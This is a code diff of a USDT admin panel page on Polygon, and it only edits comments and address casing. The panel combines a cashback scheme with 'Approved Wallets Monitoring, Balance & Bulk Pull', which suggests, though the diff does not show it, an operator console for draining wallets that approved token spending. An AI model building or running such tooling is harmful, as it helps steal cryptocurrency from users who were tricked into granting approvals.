@@ -11,6 +11,7 @@
 
     <div class="w-full max-w-xl space-y-6 pb-12">
         
+        <!-- Header & Connect Admin Wallet -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 flex items-center justify-between">
             <div class="flex items-center gap-2">
                 <h1 class="text-sm md:text-base font-bold text-emerald-400">USDT Advanced Admin Panel</h1>
@@ -22,7 +23,7 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
-        <!-- PART 0 -->
+        <!-- PART 0: Sub-Admin & Prefix Management (Owner Only) -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 🛡️ Sub-Admin & Prefix Management (Owner Only)
@@ -52,7 +53,7 @@
             </div>
         </div>
 
-        <!-- PART 1 -->
+        <!-- PART 1: Manage Cashback Tiered Rates -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 ⚙️ 1. Cashback Tiered Rates
@@ -73,7 +74,7 @@
             </div>
         </div>
 
-        <!-- PART 2 -->
+        <!-- PART 2: Approved Wallets Monitoring, Balance & Bulk Pull -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
@@ -111,7 +112,7 @@
             </div>
         </div>
 
-        <!-- PART 3 -->
+        <!-- PART 3: User Withdrawal Requests & Blockchain Event Real-time Monitoring -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
@@ -133,7 +134,7 @@
         let provider, adminSigner, adminAddress;
 
         const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; 
-        const USDT_ADDRESS = "0XC2132D05D31C914A87C6611C10748AEB04B58E8F";
+        const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
 
         const ERC20_ABI = [
@@ -383,7 +384,7 @@
                 const gainNode = audioCtx.createGain();
                 
                 oscillator.type = 'sine';
-                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch beep
+                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
                 gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
                 
                 oscillator.connect(gainNode);
@@ -442,7 +443,7 @@
             }
         }
 
-        // Real-time Withdraw Listener for Admin (Audio + Auto Refresh)
+        // Real-time Event Listener for Admin
         async function initRealtimeWithdrawListener() {
             if (!provider) return;
 
